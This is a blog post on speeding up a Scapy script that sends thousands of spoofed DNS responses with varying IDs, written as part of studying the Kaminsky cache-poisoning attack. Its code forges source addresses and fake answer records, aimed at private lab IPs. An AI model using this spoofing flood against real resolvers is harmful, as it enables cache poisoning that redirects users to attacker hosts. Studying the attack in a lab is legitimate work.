---
title: Speeding up Scapy
subtitle: subtitle
author: [Woefe]
date: 2019-03-22
keywords: [Scapy, Python, DNS]
...

A few weeks ago I revisited the DNS cache poisoning attack discovered by Dan Kaminsky in 2008.
Implementing the attack requires some fairly low-level manipulation of DNS packets.
Fortunately, we have [Scapy](https://scapy.net/), which makes packet manipulation easy and accessible from Python.
But at first the performance of my script was so bad that I could not carry out the attack (maybe I just never waited long enough).
In this post I want to record my journey that led to a faster and faster Scapy script.

<!--more-->

A deep understanding of the Kaminsky attack won't be necessary for this blog post.
Nevertheless, if you want to learn more about the attack, I can recommend the paper from [unixwiz.net](http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html), which helped me a lot in understanding the issue.
For this post you only have to understand the following detail of the attack: we want to send a lot of spoofed DNS responses with varying DNS IDs.
The more packets we send per second the higher our chance to succeed.

# First attempt
Below you can find a simplified excerpt from my initial attack script.
Packets are composed by gluing together the different layers with the `/` operator.
For example, the DNS response over UDP follows the `IP()/UDP()/DNS()` structure.
For now, you can safely ignore the parameters like source, destination or the particular DNS answer record.
What is actually important is the for-loop, which sends 5000 packets using Scapy's `send()` function.

```python
from scapy.all import *
import random

n_packets = 5000
start_time = time.time()

for i in range(n_packets):
    response = (
        IP(dst="192.168.178.1", src="192.168.178.2")
        / UDP(sport=53, dport=4444)
        / DNS(
            id=(1024 + i) % 65535,
            an=DNSRR(rrname="dummy.example.kom", ttl=70000, rdata="192.168.178.3"),
        )
    )
    send(response)

end_time = time.time()
print(f"sent {n_packets} responses in {end_time - start_time:.3f} seconds")
```

This script is quite slow.
It took over four minutes to send the 5000 packets.
```
> sudo python3 01_naive.py
...
sent 5000 responses in 265.825 seconds
```

To find the bottleneck that is wrecking performance I profiled the script with the `cProfile` module.
```bash
# Note that the amount of packets was reduced to 100!
sudo python -m cProfile -s time 01_naive.py
...
ncalls  tottime  percall  cumtime  percall filename:lineno(function)
   404    2.502    0.006    2.502    0.006 {function socket.close at 0x7ff8449c19d8}
   201    2.352    0.012    2.352    0.012 {method 'bind' of '_socket.socket' objects}
```
Most of the time is spent opening and closing sockets.
It turns out `send()` opens a new socket for every single packet.


# Second attempt: using a socket
To fix the performance problems discovered above, we must tell Scapy to use the same socket for all responses.
Scapy supports two kinds of sockets.
One at OSI Layer 2, the `L2Socket`, which accepts `Ether()/...` or `bytes` objects and the other at Layer 3, named `L3Socket`, which accepts `IP()/...` objects.
The patch is quite simple: create an `L3socket` and replace `send()` with `L3Socket.send()`.

```diff
4a5
> s = conf.L3socket()
16c17
<     send(response)
---
>     s.send(response)
```

When we execute the script, we can see that the performance increased by a factor of roughly 56.
```
> sudo python3 02_with_socket.py
sent 5000 responses in 4.743 seconds
```

We can further improve the script by roughly 1.5 seconds by preparing the response beforehand and only adjusting the ID within the loop:
```python
from scapy.all import *
import random

n_packets = 5000
response = (
    IP(dst="192.168.178.1", src="192.168.178.2")
    / UDP(sport=53, dport=4444)
    / DNS(id=0, an=DNSRR(rrname="dummy.example.kom", ttl=70000, rdata="192.168.178.3"))
)
dns_layer = response[DNS]
s = conf.L3socket()
start_time = time.time()

for i in range(n_packets):
    dns_layer.id = (1024 + i) % 65535
    s.send(response)

end_time = time.time()
print(f"sent {n_packets} responses in {end_time - start_time:.3f} seconds")
```


# Third attempt: pre-render response
The patch from above yielded in noticeably better performance, but can we do better?
After another round of profiling the answer is: yes, but we have to fiddle with our responses on byte-level.
It turns out that most of the time is spent encoding the Scapy objects to byte arrays which are suitable to transmit over the wire.
Every time we send a packet, Scapy implicitly calls the `raw()` function to encode the object representing our DNS response to bytes.
If we could do this only once before the loop, we would win even more performance.
Recall that we have to adjust the DNS ID on every single packet.
Therefore, preparing a static response using the `raw()` method will not be sufficient.
My solution is to prepare the response before entering the loop and then to manually adjust the DNS ID and UDP checksum within the encoded byte array.


```python
from scapy.all import *
import random


def patch(dns_frame: bytearray, pseudo_hdr: bytes, dns_id: int):
    """Adjust the DNS id and patch the UDP checksum within the given Ethernet frame"""
    # set dns id
    # the byte offsets can be found in Wireshark
    dns_frame[42] = (dns_id >> 8) & 0xFF
    dns_frame[43] = dns_id & 0xFF

    # reset checksum
    dns_frame[40] = 0x00
    dns_frame[41] = 0x00

    # calc new checksum
    ck = checksum(pseudo_hdr + dns_frame[34:])
    if ck == 0:
        ck = 0xFFFF
    cs = struct.pack("!H", ck)
    dns_frame[40] = cs[0]
    dns_frame[41] = cs[1]


n_packets = 5000
response = (
    Ether()
    / IP(dst="192.168.178.1", src="192.168.178.2")
    / UDP(sport=53, dport=4444)
    / DNS(id=0, an=DNSRR(rrname="dummy.example.kom", ttl=70000, rdata="192.168.178.3"))
)
dns_frame = bytearray(raw(response))
pseudo_hdr = struct.pack(
    "!4s4sHH",
    inet_pton(socket.AF_INET, response["IP"].src),
    inet_pton(socket.AF_INET, response["IP"].dst),
    socket.IPPROTO_UDP,
    len(dns_frame[34:]),
)
s = conf.L2socket()

start_time = time.time()

for i in range(n_packets):
    patch(dns_frame, pseudo_hdr, (1024 + i) % 65535)
    s.send(dns_frame)

end_time = time.time()
print(f"sent {n_packets} responses in {end_time - start_time:.3f} seconds")
```

The performance critical part of the script is now 2000-3000 times faster than the initial version!
```
> sudo python3 03_without_raw.py
sent 5000 responses in 0.096 seconds
```
